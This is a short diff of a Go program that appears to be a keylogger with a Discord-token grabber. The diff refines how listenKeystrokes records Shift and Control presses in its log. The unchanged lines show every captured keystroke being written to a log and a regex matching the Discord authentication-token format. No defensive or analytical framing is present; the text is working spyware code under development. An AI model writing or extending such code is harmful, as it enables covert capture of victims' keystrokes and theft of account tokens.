@@ -76,6 +76,8 @@ var (
 		"LEFT":       "<ARROW_LEFT>",
 		"DOWN":       "<ARROW_DOWN>",
 		"RIGHT":      "<ARROW_RIGHT>",
+  "LCONTROL":      "<L_CONTROL>",
+  "RCONTROL":      "<R_CONTROL>",
 	}
 
 	REGEX = regexp.MustCompile(`[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}`)
@@ -389,8 +391,10 @@ func listenKeystrokes(stat bool) {
 					LOG.WriteString("<capital>\n")
 				}
 			case types.VK_LSHIFT:
-				CAPS = true
-				LOG.WriteString("<SHIFT>\n")
+    if !CAPS {
+     CAPS = true
+			 	LOG.WriteString("<L_SHIFT>\n")
+    }
 			default:
 				if CAPS {
 					LOG.WriteString(char + "\n")
@@ -402,7 +406,7 @@ func listenKeystrokes(stat bool) {
 		case types.WM_KEYUP:
 			if key.VKCode == types.VK_LSHIFT {
 				CAPS = false
-				LOG.WriteString("</shift>\n")
+				LOG.WriteString("</l_shift>\n")
 			}
 		}
 	}
